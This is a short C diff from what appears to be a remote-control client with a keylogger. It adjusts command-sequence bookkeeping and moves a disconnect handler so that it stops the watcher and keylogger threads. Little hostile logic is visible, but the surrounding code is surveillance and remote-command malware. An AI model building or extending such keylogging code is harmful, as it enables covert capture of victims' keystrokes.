@@ -129,9 +129,10 @@ bool handle_command_codes(struct session_info * session_info, const struct packe
             session_info->command_counter++;
         } else {
             session_info->last_command_code = encountered_command_code;
-            session_info->last_command_sequence_number = node->sequence_number;
             session_info->command_counter = 1;
         }
+
+        session_info->last_command_sequence_number = node->sequence_number;
 
         log_message("Cur seq: %d, Prev seq: %d, CC: %d, code: %d", node->sequence_number, session_info->last_command_sequence_number, session_info->command_counter, encountered_command_code);
 
@@ -329,6 +330,17 @@ void stop_keylogger(struct session_info * session_info) {
     if (remove(KEYLOG_FILE_PATH) != 0) {
         perror("Error removing keylog");
     }
+#endif
+}
+
+// NOLINTNEXTLINE
+void handle_disconnect(struct session_info * session_info) {
+    connection_loop = false;
+#ifdef CLIENT_BUILD
+    session_info->run_watcher = false;
+    pthread_join(session_info->watcher_thread, NULL);
+    session_info->run_keylogger = false;
+    pthread_join(session_info->keylogger_thread, NULL);
 #endif
 }
 
@@ -548,11 +560,6 @@ void process_run_command(struct session_info * session_info) {
         run_process(session_info, command);
     #endif
 
-}
-
-// NOLINTNEXTLINE
-void handle_disconnect(struct session_info * session_info) {
-    connection_loop = false;
 }
 
 // NOLINTNEXTLINE
